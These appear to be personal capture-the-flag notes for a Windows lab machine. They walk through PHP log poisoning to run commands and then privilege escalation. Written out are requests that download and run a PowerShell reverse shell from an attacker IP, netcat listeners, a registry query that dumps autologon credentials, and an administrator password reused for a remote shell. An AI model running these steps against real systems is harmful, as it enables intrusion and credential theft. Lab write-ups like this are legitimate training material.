Shell as iusr
-------------
- each time someone visits log.php it records the time, username and the useragent string
- lets see if we can exploit this in some ways 
- we can intercept the request to logs and send that to repeater 
- poison the user-agent to request for a php parameter and change the ename to log.php (check notion)
- on sending this over we see the result in the response
- now we can add the lordcmd paramater to the GET request to try to execute commands

	GET /log/log.php?filename=log.php&username=harvey&lordcmd=whoami

- on sending this request we get the output of the command in the response as harvey
- now we can try to get a shell out of this 
- copy the nashang Invoke-PowerShellTcp.ps1 over to the current working directory and make appropriate changes and host it with a python server
- start a netcat listener

	nc -nlvp 9001

- we can try to download and execute the reverse shell

	GET /log/log.php?filename=log.php&username=harvey&lordcmd=powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.15.54:1234/rev.ps1')

- send the request and we will get a shell as nt authority\iusr

Priv-esc
--------
- enumerating with standard windows privesc checks we found default credentials stored in the registry for autologon
- we are not able to query it from our shell
- to get this to work we can upload a nc64.exe and get a 64 bit shell then we will be able to dumb credentials from the registry

	reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"

- there are two ways which we can use this credentials to get access to administrator owned files
	- run as
	- net use 

run as
------
- we can use the password to create a credential object that can be passed to Invoke-Command
- start a netcat listener 

	nc -lnvp 5555

- setup another nishang Invoke-PowerShellTcp.ps1 reverse shell as shell.ps1 with port 5555

	PS C:\inetpub\wwwroot\internal-01\log> $username = "BART\Administrator"
	PS C:\inetpub\wwwroot\internal-01\log> $password = "3130438f31186fbaf962f407711faddb"
	PS C:\inetpub\wwwroot\internal-01\log> $secstr = New-Object -TypeName System.Security.SecureString
	PS C:\inetpub\wwwroot\internal-01\log> $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
	PS C:\inetpub\wwwroot\internal-01\log> $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
	PS C:\inetpub\wwwroot\internal-01\log> Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.15.48:8083/shell.ps1') } -Credential $cred -Computer localhost

- we got a shell as bart\administrator
- grab the flags
